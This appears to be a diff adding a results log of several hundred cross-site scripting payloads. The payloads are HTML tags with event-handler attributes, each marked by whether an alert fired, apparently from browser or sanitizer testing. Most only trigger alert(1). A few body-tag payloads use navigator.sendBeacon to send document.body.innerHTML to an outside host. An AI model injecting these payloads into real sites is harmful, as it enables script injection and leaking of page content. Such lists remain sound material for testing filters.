@@ -1,0 +1,410 @@
+Payload: <address oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <address oncontextmenu="alert(1)" style=display:block>test</address> | Alert: False
+Payload: <animate oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <animate oncontextmenu="alert(1)" style=display:block>test</animate> | Alert: False
+Payload: <animatemotion oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <animatemotion oncontextmenu="alert(1)" style=display:block>test</animatemotion> | Alert: False
+Payload: <animatetransform oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <animatetransform oncontextmenu="alert(1)" style=display:block>test</animatetransform> | Alert: False
+Payload: <applet oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <applet oncontextmenu="alert(1)" style=display:block>test</applet> | Alert: False
+Payload: <area oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <area oncontextmenu="alert(1)" style=display:block>test</area> | Alert: False
+Payload: <article oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <article oncontextmenu="alert(1)" style=display:block>test</article> | Alert: False
+Payload: <aside oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <aside oncontextmenu="alert(1)" style=display:block>test</aside> | Alert: False
+Payload: <audio2 oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <audio2 oncontextmenu="alert(1)" style=display:block>test</audio2> | Alert: False
+Payload: <b oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <b oncontextmenu="alert(1)" style=display:block>test</b> | Alert: False
+Payload: <b oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test | Alert: False
+Payload: <b oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test | Alert: False
+Payload: <b ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</b> | Alert: False
+Payload: <b onfocus=alert(1) autofocus tabindex=1> | Alert: False
+Payload: <b onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</b><input value=clickme> | Alert: False
+Payload: <b onkeydown="alert(1)" contenteditable style=display:block>test</b> | Alert: False
+Payload: <b onkeypress="alert(1)" contenteditable style=display:block>test</b> | Alert: False
+Payload: <b onkeyup="alert(1)" contenteditable style=display:block>test</b> | Alert: False
+Payload: <b onmousedown="alert(1)" style=display:block>test</b> | Alert: False
+Payload: <b onmouseenter="alert(1)" style=display:block>test</b> | Alert: False
+Payload: <b onmouseleave="alert(1)" style=display:block>test</b> | Alert: False
+Payload: <bdi oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <bdi oncontextmenu="alert(1)" style=display:block>test</bdi> | Alert: False
+Payload: <bdo oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <bdo oncontextmenu="alert(1)" style=display:block>test</bdo> | Alert: False
+Payload: <big oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <big oncontextmenu="alert(1)" style=display:block>test</big> | Alert: False
+Payload: <big oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test | Alert: False
+Payload: <big oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test | Alert: False
+Payload: <big ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</big> | Alert: False
+Payload: <big onfocus=alert(1) autofocus tabindex=1> | Alert: False
+Payload: <big onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</big><input value=clickme> | Alert: False
+Payload: <big onkeydown="alert(1)" contenteditable style=display:block>test</big> | Alert: False
+Payload: <big onkeypress="alert(1)" contenteditable style=display:block>test</big> | Alert: False
+Payload: <big onkeyup="alert(1)" contenteditable style=display:block>test</big> | Alert: False
+Payload: <big onmousedown="alert(1)" style=display:block>test</big> | Alert: False
+Payload: <big onmouseenter="alert(1)" style=display:block>test</big> | Alert: False
+Payload: <big onmouseleave="alert(1)" style=display:block>test</big> | Alert: False
+Payload: <big onmousemove="alert(1)" style=display:block>test</big> | Alert: False
+Payload: <big onmouseout="alert(1)" style=display:block>test</big> | Alert: False
+Payload: <big onmouseover="alert(1)" style=display:block>test</big> | Alert: False
+Payload: <big onpointerenter=alert(1) style=display:block>XSS</big> | Alert: False
+Payload: <big onpointerleave=alert(1) style=display:block>XSS</big> | Alert: False
+Payload: <blink oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <blink oncontextmenu="alert(1)" style=display:block>test</blink> | Alert: False
+Payload: <blockquote oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <blockquote oncontextmenu="alert(1)" style=display:block>test</blockquote> | Alert: False
+Payload: <body contenteditable onbeforeinput=alert(1)>test | Alert: False
+Payload: <body id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></body> | Alert: False
+Payload: <body id=x tabindex=1 onfocus=alert(1)></body> | Alert: True
+Payload: <body id=x tabindex=1 onfocusin=alert(1)></body> | Alert: False
+Payload: <body onafterprint=alert(1)> | Alert: False
+Payload: <body onbeforeprint=console.log(1)> | Alert: False
+Payload: <body onbeforeunload=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)> | Alert: False
+Payload: <body onblur=alert(1) id=x tabindex=1 style=display:block>test</body><input value=clickme> | Alert: False
+Payload: <body oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <body oncontextmenu="alert(1)" style=display:block>test</body> | Alert: False
+Payload: <body oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test | Alert: False
+Payload: <body oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test | Alert: False
+Payload: <body onerror=alert(1) onload=/> | Alert: True
+Payload: <body onfocus=alert(1) autofocus tabindex=1> | Alert: True
+Payload: <body onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</body><input value=clickme> | Alert: False
+Payload: <body onload=alert(1)> | Alert: True
+Payload: <body onmessage=print()> | Alert: False
+Payload: <body onmousewheel=alert(1) style=display:block>requires scrolling | Alert: False
+Payload: <body onpagehide=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)> | Alert: False
+Payload: <body onpageshow=alert(1)> | Alert: True
+Payload: <body onpointercancel=alert(1)>XSS</body> | Alert: False
+Payload: <body onpointerdown=alert(1) style=display:block>XSS</body> | Alert: False
+Payload: <body onpointerenter=alert(1) style=display:block>XSS</body> | Alert: False
+Payload: <body onpointerleave=alert(1) style=display:block>XSS</body> | Alert: False
+Payload: <body onpointermove=alert(1) style=display:block>XSS</body> | Alert: False
+Payload: <body onpointerout=alert(1) style=display:block>XSS</body> | Alert: False
+Payload: <body onpointerover=alert(1) style=display:block>XSS</body> | Alert: False
+Payload: <body onpointerrawupdate=alert(1) style=display:block>XSS</body> | Alert: False
+Payload: <body onpointerup=alert(1) style=display:block>XSS</body> | Alert: False
+Payload: <body onpopstate=print()> | Alert: False
+Payload: <body onscroll=alert(1)><div style=height:1000px></div><div id=x></div> | Alert: False
+Payload: <body onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></body> | Alert: False
+Payload: <body onselectionchange=alert(1)>select some text | Alert: False
+Payload: <body onselectstart=alert(1)>select some text | Alert: False
+Payload: <body ontouchend=alert(1)> | Alert: False
+Payload: <body ontouchmove=alert(1)> | Alert: False
+Payload: <body ontouchstart=alert(1)> | Alert: False
+Payload: <body onunload=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)> | Alert: False
+Payload: <body onwebkitmouseforcechanged=alert(1)>XSS</body> | Alert: False
+Payload: <body onwebkitmouseforcedown=alert(1)>XSS</body> | Alert: False
+Payload: <body onwebkitmouseforceup=alert(1)>XSS</body> | Alert: False
+Payload: <body onwebkitmouseforcewillbegin=alert(1)>XSS</body> | Alert: False
+Payload: <body onwebkitwillrevealbottom=alert(1)>XSS</body> | Alert: False
+Payload: <body onwheel=alert(1)> | Alert: False
+Payload: <button oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <button oncontextmenu="alert(1)" style=display:block>test</button> | Alert: False
+Payload: <button popovertarget=x>Click me</button><body onbeforetoggle=alert(1) popover id=x>XSS</body> | Alert: False
+Payload: <button popovertarget=x>Click me</button><body ontoggle=alert(1) popover id=x>XSS</body> | Alert: False
+Payload: <button popovertarget=x>Click me</button><caption onbeforetoggle=alert(1) popover id=x>XSS</caption> | Alert: False
+Payload: <button popovertarget=x>Click me</button><caption ontoggle=alert(1) popover id=x>XSS</caption> | Alert: False
+Payload: <button popovertarget=x>Click me</button><col onbeforetoggle=alert(1) popover id=x>XSS</col> | Alert: False
+Payload: <button popovertarget=x>Click me</button><col ontoggle=alert(1) popover id=x>XSS</col> | Alert: False
+Payload: <button popovertarget=x>Click me</button><colgroup onbeforetoggle=alert(1) popover id=x>XSS</colgroup> | Alert: False
+Payload: <button popovertarget=x>Click me</button><colgroup ontoggle=alert(1) popover id=x>XSS</colgroup> | Alert: False
+Payload: <button popovertarget=x>Click me</button><frame onbeforetoggle=alert(1) popover id=x>XSS</frame> | Alert: False
+Payload: <button popovertarget=x>Click me</button><frame ontoggle=alert(1) popover id=x>XSS</frame> | Alert: False
+Payload: <button popovertarget=x>Click me</button><frameset onbeforetoggle=alert(1) popover id=x>XSS</frameset> | Alert: False
+Payload: <button popovertarget=x>Click me</button><frameset ontoggle=alert(1) popover id=x>XSS</frameset> | Alert: False
+Payload: <button popovertarget=x>Click me</button><head onbeforetoggle=alert(1) popover id=x>XSS</head> | Alert: False
+Payload: <button popovertarget=x>Click me</button><head ontoggle=alert(1) popover id=x>XSS</head> | Alert: False
+Payload: <button popovertarget=x>Click me</button><html onbeforetoggle=alert(1) popover id=x>XSS</html> | Alert: False
+Payload: <button popovertarget=x>Click me</button><html ontoggle=alert(1) popover id=x>XSS</html> | Alert: False
+Payload: <button popovertarget=x>Click me</button><tbody onbeforetoggle=alert(1) popover id=x>XSS</tbody> | Alert: False
+Payload: <button popovertarget=x>Click me</button><tbody ontoggle=alert(1) popover id=x>XSS</tbody> | Alert: False
+Payload: <button popovertarget=x>Click me</button><td onbeforetoggle=alert(1) popover id=x>XSS</td> | Alert: False
+Payload: <button popovertarget=x>Click me</button><td ontoggle=alert(1) popover id=x>XSS</td> | Alert: False
+Payload: <button popovertarget=x>Click me</button><tfoot onbeforetoggle=alert(1) popover id=x>XSS</tfoot> | Alert: False
+Payload: <button popovertarget=x>Click me</button><tfoot ontoggle=alert(1) popover id=x>XSS</tfoot> | Alert: False
+Payload: <button popovertarget=x>Click me</button><th onbeforetoggle=alert(1) popover id=x>XSS</th> | Alert: False
+Payload: <button popovertarget=x>Click me</button><th ontoggle=alert(1) popover id=x>XSS</th> | Alert: False
+Payload: <button popovertarget=x>Click me</button><thead onbeforetoggle=alert(1) popover id=x>XSS</thead> | Alert: False
+Payload: <button popovertarget=x>Click me</button><thead ontoggle=alert(1) popover id=x>XSS</thead> | Alert: False
+Payload: <button popovertarget=x>Click me</button><tr onbeforetoggle=alert(1) popover id=x>XSS</tr> | Alert: False
+Payload: <button popovertarget=x>Click me</button><tr ontoggle=alert(1) popover id=x>XSS</tr> | Alert: False
+Payload: <caption contenteditable onbeforeinput=alert(1)>test | Alert: False
+Payload: <caption id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></caption> | Alert: False
+Payload: <caption id=x tabindex=1 onfocus=alert(1)></caption> | Alert: False
+Payload: <caption id=x tabindex=1 onfocusin=alert(1)></caption> | Alert: False
+Payload: <caption onblur=alert(1) id=x tabindex=1 style=display:block>test</caption><input value=clickme> | Alert: False
+Payload: <caption oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: False
+Payload: <caption oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test | Alert: False
+Payload: <caption oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test | Alert: False
+Payload: <caption onfocus=alert(1) autofocus tabindex=1> | Alert: False
+Payload: <caption onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</caption><input value=clickme> | Alert: False
+Payload: <caption onmousewheel=alert(1) style=display:block>requires scrolling | Alert: False
+Payload: <caption onpointercancel=alert(1)>XSS</caption> | Alert: False
+Payload: <caption onpointerdown=alert(1) style=display:block>XSS</caption> | Alert: False
+Payload: <caption onpointerenter=alert(1) style=display:block>XSS</caption> | Alert: False
+Payload: <caption onpointerleave=alert(1) style=display:block>XSS</caption> | Alert: False
+Payload: <caption onpointermove=alert(1) style=display:block>XSS</caption> | Alert: False
+Payload: <caption onpointerout=alert(1) style=display:block>XSS</caption> | Alert: False
+Payload: <caption onpointerover=alert(1) style=display:block>XSS</caption> | Alert: False
+Payload: <caption onpointerrawupdate=alert(1) style=display:block>XSS</caption> | Alert: False
+Payload: <caption onpointerup=alert(1) style=display:block>XSS</caption> | Alert: False
+Payload: <caption onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></caption> | Alert: False
+Payload: <caption onwebkitmouseforcechanged=alert(1)>XSS</caption> | Alert: False
+Payload: <caption onwebkitmouseforcedown=alert(1)>XSS</caption> | Alert: False
+Payload: <caption onwebkitmouseforceup=alert(1)>XSS</caption> | Alert: False
+Payload: <caption onwebkitmouseforcewillbegin=alert(1)>XSS</caption> | Alert: False
+Payload: <caption onwebkitwillrevealbottom=alert(1)>XSS</caption> | Alert: False
+Payload: <center oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <center oncontextmenu="alert(1)" style=display:block>test</center> | Alert: False
+Payload: <cite oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <cite oncontextmenu="alert(1)" style=display:block>test</cite> | Alert: False
+Payload: <code oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <code oncontextmenu="alert(1)" style=display:block>test</code> | Alert: False
+Payload: <code oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test | Alert: False
+Payload: <code oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test | Alert: False
+Payload: <code ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</code> | Alert: False
+Payload: <code onfocus=alert(1) autofocus tabindex=1> | Alert: False
+Payload: <code onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</code><input value=clickme> | Alert: False
+Payload: <code onkeydown="alert(1)" contenteditable style=display:block>test</code> | Alert: False
+Payload: <code onkeypress="alert(1)" contenteditable style=display:block>test</code> | Alert: False
+Payload: <code onkeyup="alert(1)" contenteditable style=display:block>test</code> | Alert: False
+Payload: <code onmousedown="alert(1)" style=display:block>test</code> | Alert: False
+Payload: <code onmouseenter="alert(1)" style=display:block>test</code> | Alert: False
+Payload: <col contenteditable onbeforeinput=alert(1)>test | Alert: False
+Payload: <col id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></col> | Alert: False
+Payload: <col id=x tabindex=1 onfocus=alert(1)></col> | Alert: False
+Payload: <col id=x tabindex=1 onfocusin=alert(1)></col> | Alert: False
+Payload: <col onblur=alert(1) id=x tabindex=1 style=display:block>test</col><input value=clickme> | Alert: False
+Payload: <col oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: False
+Payload: <col oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test | Alert: False
+Payload: <col oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test | Alert: False
+Payload: <col onfocus=alert(1) autofocus tabindex=1> | Alert: False
+Payload: <col onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</col><input value=clickme> | Alert: False
+Payload: <col onmousewheel=alert(1) style=display:block>requires scrolling | Alert: False
+Payload: <col onpointercancel=alert(1)>XSS</col> | Alert: False
+Payload: <col onpointerdown=alert(1) style=display:block>XSS</col> | Alert: False
+Payload: <col onpointerenter=alert(1) style=display:block>XSS</col> | Alert: False
+Payload: <col onpointerleave=alert(1) style=display:block>XSS</col> | Alert: False
+Payload: <col onpointermove=alert(1) style=display:block>XSS</col> | Alert: False
+Payload: <col onpointerout=alert(1) style=display:block>XSS</col> | Alert: False
+Payload: <col onpointerover=alert(1) style=display:block>XSS</col> | Alert: False
+Payload: <col onpointerrawupdate=alert(1) style=display:block>XSS</col> | Alert: False
+Payload: <col onpointerup=alert(1) style=display:block>XSS</col> | Alert: False
+Payload: <col onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></col> | Alert: False
+Payload: <col onwebkitmouseforcechanged=alert(1)>XSS</col> | Alert: False
+Payload: <col onwebkitmouseforcedown=alert(1)>XSS</col> | Alert: False
+Payload: <col onwebkitmouseforceup=alert(1)>XSS</col> | Alert: False
+Payload: <col onwebkitmouseforcewillbegin=alert(1)>XSS</col> | Alert: False
+Payload: <col onwebkitwillrevealbottom=alert(1)>XSS</col> | Alert: False
+Payload: <colgroup contenteditable onbeforeinput=alert(1)>test | Alert: False
+Payload: <colgroup id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></colgroup> | Alert: False
+Payload: <colgroup id=x tabindex=1 onfocus=alert(1)></colgroup> | Alert: False
+Payload: <colgroup id=x tabindex=1 onfocusin=alert(1)></colgroup> | Alert: False
+Payload: <colgroup onblur=alert(1) id=x tabindex=1 style=display:block>test</colgroup><input value=clickme> | Alert: False
+Payload: <colgroup oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: False
+Payload: <colgroup oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test | Alert: False
+Payload: <colgroup oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test | Alert: False
+Payload: <colgroup onfocus=alert(1) autofocus tabindex=1> | Alert: False
+Payload: <colgroup onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</colgroup><input value=clickme> | Alert: False
+Payload: <colgroup onmousewheel=alert(1) style=display:block>requires scrolling | Alert: False
+Payload: <colgroup onpointercancel=alert(1)>XSS</colgroup> | Alert: False
+Payload: <colgroup onpointerdown=alert(1) style=display:block>XSS</colgroup> | Alert: False
+Payload: <colgroup onpointerenter=alert(1) style=display:block>XSS</colgroup> | Alert: False
+Payload: <colgroup onpointerleave=alert(1) style=display:block>XSS</colgroup> | Alert: False
+Payload: <colgroup onpointermove=alert(1) style=display:block>XSS</colgroup> | Alert: False
+Payload: <colgroup onpointerout=alert(1) style=display:block>XSS</colgroup> | Alert: False
+Payload: <colgroup onpointerover=alert(1) style=display:block>XSS</colgroup> | Alert: False
+Payload: <colgroup onpointerrawupdate=alert(1) style=display:block>XSS</colgroup> | Alert: False
+Payload: <colgroup onpointerup=alert(1) style=display:block>XSS</colgroup> | Alert: False
+Payload: <colgroup onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></colgroup> | Alert: False
+Payload: <colgroup onwebkitmouseforcechanged=alert(1)>XSS</colgroup> | Alert: False
+Payload: <colgroup onwebkitmouseforcedown=alert(1)>XSS</colgroup> | Alert: False
+Payload: <colgroup onwebkitmouseforceup=alert(1)>XSS</colgroup> | Alert: False
+Payload: <colgroup onwebkitmouseforcewillbegin=alert(1)>XSS</colgroup> | Alert: False
+Payload: <colgroup onwebkitwillrevealbottom=alert(1)>XSS</colgroup> | Alert: False
+Payload: <command oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <command oncontextmenu="alert(1)" style=display:block>test</command> | Alert: False
+Payload: <content oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <content oncontextmenu="alert(1)" style=display:block>test</content> | Alert: False
+Payload: <custom tags oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <custom tags oncontextmenu="alert(1)" style=display:block>test</custom tags> | Alert: False
+Payload: <data oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <data oncontextmenu="alert(1)" style=display:block>test</data> | Alert: False
+Payload: <dd oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <dd oncontextmenu="alert(1)" style=display:block>test</dd> | Alert: False
+Payload: <del oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <del oncontextmenu="alert(1)" style=display:block>test</del> | Alert: False
+Payload: <dfn oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <dfn oncontextmenu="alert(1)" style=display:block>test</dfn> | Alert: False
+Payload: <dialog oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <dialog oncontextmenu="alert(1)" style=display:block>test</dialog> | Alert: False
+Payload: <dir oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <dir oncontextmenu="alert(1)" style=display:block>test</dir> | Alert: False
+Payload: <div oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <div oncontextmenu="alert(1)" style=display:block>test</div> | Alert: False
+Payload: <dl oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <dl oncontextmenu="alert(1)" style=display:block>test</dl> | Alert: False
+Payload: <element oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <element oncontextmenu="alert(1)" style=display:block>test</element> | Alert: False
+Payload: <em oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <em oncontextmenu="alert(1)" style=display:block>test</em> | Alert: False
+Payload: <em oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test | Alert: False
+Payload: <em oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test | Alert: False
+Payload: <em ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</em> | Alert: False
+Payload: <em onfocus=alert(1) autofocus tabindex=1> | Alert: False
+Payload: <em onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</em><input value=clickme> | Alert: False
+Payload: <em onkeydown="alert(1)" contenteditable style=display:block>test</em> | Alert: False
+Payload: <em onkeypress="alert(1)" contenteditable style=display:block>test</em> | Alert: False
+Payload: <em onkeyup="alert(1)" contenteditable style=display:block>test</em> | Alert: False
+Payload: <em onmousedown="alert(1)" style=display:block>test</em> | Alert: False
+Payload: <em onmouseenter="alert(1)" style=display:block>test</em> | Alert: False
+Payload: <fieldset oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <fieldset oncontextmenu="alert(1)" style=display:block>test</fieldset> | Alert: False
+Payload: <figcaption oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <figcaption oncontextmenu="alert(1)" style=display:block>test</figcaption> | Alert: False
+Payload: <font oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <font oncontextmenu="alert(1)" style=display:block>test</font> | Alert: False
+Payload: <font oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test | Alert: False
+Payload: <font oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test | Alert: False
+Payload: <font ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</font> | Alert: False
+Payload: <font onfocus=alert(1) autofocus tabindex=1> | Alert: False
+Payload: <font onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</font><input value=clickme> | Alert: False
+Payload: <font onkeydown="alert(1)" contenteditable style=display:block>test</font> | Alert: False
+Payload: <font onkeypress="alert(1)" contenteditable style=display:block>test</font> | Alert: False
+Payload: <font onkeyup="alert(1)" contenteditable style=display:block>test</font> | Alert: False
+Payload: <footer oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <footer oncontextmenu="alert(1)" style=display:block>test</footer> | Alert: False
+Payload: <form oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <form oncontextmenu="alert(1)" style=display:block>test</form> | Alert: False
+Payload: <frame contenteditable onbeforeinput=alert(1)>test | Alert: False
+Payload: <frame id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></frame> | Alert: False
+Payload: <frame onblur=alert(1) id=x tabindex=1 style=display:block>test</frame><input value=clickme> | Alert: False
+Payload: <frame oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: False
+Payload: <frame oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test | Alert: False
+Payload: <frame oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test | Alert: False
+Payload: <frame onfocus=alert(1) autofocus tabindex=1> | Alert: False
+Payload: <frame onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</frame><input value=clickme> | Alert: False
+Payload: <frame onmousewheel=alert(1) style=display:block>requires scrolling | Alert: False
+Payload: <frame onpointercancel=alert(1)>XSS</frame> | Alert: False
+Payload: <frame onpointerdown=alert(1) style=display:block>XSS</frame> | Alert: False
+Payload: <frame onpointerenter=alert(1) style=display:block>XSS</frame> | Alert: False
+Payload: <frame onpointerleave=alert(1) style=display:block>XSS</frame> | Alert: False
+Payload: <frame onpointermove=alert(1) style=display:block>XSS</frame> | Alert: False
+Payload: <frame onpointerout=alert(1) style=display:block>XSS</frame> | Alert: False
+Payload: <frame onpointerover=alert(1) style=display:block>XSS</frame> | Alert: False
+Payload: <frame onpointerrawupdate=alert(1) style=display:block>XSS</frame> | Alert: False
+Payload: <frame onpointerup=alert(1) style=display:block>XSS</frame> | Alert: False
+Payload: <frame onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></frame> | Alert: False
+Payload: <frame onwebkitmouseforcechanged=alert(1)>XSS</frame> | Alert: False
+Payload: <frame onwebkitmouseforcedown=alert(1)>XSS</frame> | Alert: False
+Payload: <frame onwebkitmouseforceup=alert(1)>XSS</frame> | Alert: False
+Payload: <frame onwebkitmouseforcewillbegin=alert(1)>XSS</frame> | Alert: False
+Payload: <frame onwebkitwillrevealbottom=alert(1)>XSS</frame> | Alert: False
+Payload: <frameset contenteditable onbeforeinput=alert(1)>test | Alert: False
+Payload: <frameset id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></frameset> | Alert: False
+Payload: <frameset id=x tabindex=1 onfocus=alert(1)></frameset> | Alert: False
+Payload: <frameset id=x tabindex=1 onfocusin=alert(1)></frameset> | Alert: False
+Payload: <frameset onblur=alert(1) id=x tabindex=1 style=display:block>test</frameset><input value=clickme> | Alert: False
+Payload: <frameset oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: False
+Payload: <frameset oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test | Alert: False
+Payload: <frameset oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test | Alert: False
+Payload: <frameset onfocus=alert(1) autofocus tabindex=1> | Alert: False
+Payload: <frameset onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</frameset><input value=clickme> | Alert: False
+Payload: <frameset onmousewheel=alert(1) style=display:block>requires scrolling | Alert: False
+Payload: <frameset onpageshow=alert(1)> | Alert: False
+Payload: <frameset onpointercancel=alert(1)>XSS</frameset> | Alert: False
+Payload: <frameset onpointerdown=alert(1) style=display:block>XSS</frameset> | Alert: False
+Payload: <frameset onpointerenter=alert(1) style=display:block>XSS</frameset> | Alert: False
+Payload: <frameset onpointerleave=alert(1) style=display:block>XSS</frameset> | Alert: False
+Payload: <frameset onpointermove=alert(1) style=display:block>XSS</frameset> | Alert: False
+Payload: <frameset onpointerout=alert(1) style=display:block>XSS</frameset> | Alert: False
+Payload: <frameset onpointerover=alert(1) style=display:block>XSS</frameset> | Alert: False
+Payload: <frameset onpointerrawupdate=alert(1) style=display:block>XSS</frameset> | Alert: False
+Payload: <frameset onpointerup=alert(1) style=display:block>XSS</frameset> | Alert: False
+Payload: <frameset onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></frameset> | Alert: False
+Payload: <frameset onwebkitmouseforcechanged=alert(1)>XSS</frameset> | Alert: False
+Payload: <frameset onwebkitmouseforcedown=alert(1)>XSS</frameset> | Alert: False
+Payload: <frameset onwebkitmouseforceup=alert(1)>XSS</frameset> | Alert: False
+Payload: <frameset onwebkitmouseforcewillbegin=alert(1)>XSS</frameset> | Alert: False
+Payload: <frameset onwebkitwillrevealbottom=alert(1)>XSS</frameset> | Alert: False
